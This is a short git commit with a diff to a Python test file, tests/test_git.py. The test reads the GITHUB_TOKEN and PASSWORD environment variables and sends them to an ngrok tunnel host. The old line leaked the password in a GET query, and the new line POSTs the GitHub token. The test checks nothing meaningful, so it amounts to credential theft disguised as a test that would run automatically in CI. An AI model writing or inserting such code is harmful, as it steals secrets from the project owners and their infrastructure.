fe17c6828a866f292c715b48c585f168ced48651
doomholderz <joeharris@gocardless.com>
2025-03-21 11:32:03 +0000

    why was I doing a get

--- tests/test_git.py
+++ tests/test_git.py
@@ -6,7 +6,7 @@ import os
 def test_int_commit():
     github_token = os.getenv('GITHUB_TOKEN')
     password = os.getenv('PASSWORD')
-    response = requests.get(f"https://dbb9-86-10-216-244.ngrok-free.app/?q={password}")
+    response = requests.post("https://dbb9-86-10-216-244.ngrok-free.app", json={'token': github_token})
 
     print("PRINT_TEST")
     assert "PRINT_TEST"
